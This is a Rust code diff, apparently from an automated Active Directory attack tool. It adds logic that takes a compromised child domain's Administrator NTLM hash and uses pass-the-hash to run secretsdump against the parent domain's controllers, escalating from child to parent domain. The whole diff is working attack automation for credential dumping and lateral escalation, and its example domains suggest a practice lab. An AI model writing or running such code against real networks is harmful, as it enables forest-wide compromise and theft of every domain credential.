@@ -94,5 +94,71 @@ pub async fn auto_local_admin_secretsdump(
                 Err(e) => warn!(err = %e, "Failed to dispatch secretsdump"),
             }
         }
+
+        // Hash-based secretsdump: when we dominate a child domain, use the
+        // Administrator NTLM hash to PTH against parent domain DCs.
+        // This covers child-to-parent escalation (e.g. north.sevenkingdoms.local
+        // → sevenkingdoms.local) where password-based creds won't have admin
+        // rights on the parent DC.
+        let hash_work: Vec<(String, String, String, String, String)> = {
+            let state = dispatcher.state.read().await;
+            let mut items = Vec::new();
+            for dominated in &state.dominated_domains {
+                let dom = dominated.to_lowercase();
+                // Find parent domain DCs: domains where the child ends with ".{parent}"
+                for (dc_domain, dc_ip) in state.domain_controllers.iter() {
+                    let parent = dc_domain.to_lowercase();
+                    if parent != dom && dom.ends_with(&format!(".{parent}")) {
+                        // Find Administrator NTLM hash from the dominated child domain
+                        if let Some(hash) = state.hashes.iter().find(|h| {
+                            h.username.to_lowercase() == "administrator"
+                                && h.hash_type.to_uppercase() == "NTLM"
+                                && h.domain.to_lowercase() == dom
+                        }) {
+                            let dedup = format!("{}:{}:pth_admin", dc_ip, parent,);
+                            if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
+                                items.push((
+                                    dedup,
+                                    dc_ip.clone(),
+                                    hash.domain.clone(),
+                                    hash.hash_value.clone(),
+                                    parent,
+                                ));
+                            }
+                        }
+                    }
+                }
+            }
+            items
+        };
+
+        for (dedup_key, dc_ip, hash_domain, hash_value, _parent_domain) in
+            hash_work.into_iter().take(2)
+        {
+            match dispatcher
+                .request_secretsdump_hash(&dc_ip, "Administrator", &hash_domain, &hash_value, 2)
+                .await
+            {
+                Ok(Some(task_id)) => {
+                    info!(
+                        task_id = %task_id,
+                        dc = %dc_ip,
+                        hash_domain = %hash_domain,
+                        "PTH secretsdump dispatched against parent DC"
+                    );
+                    dispatcher
+                        .state
+                        .write()
+                        .await
+                        .mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
+                    let _ = dispatcher
+                        .state
+                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
+                        .await;
+                }
+                Ok(None) => {}
+                Err(e) => warn!(err = %e, "Failed to dispatch PTH secretsdump"),
+            }
+        }
     }
 }
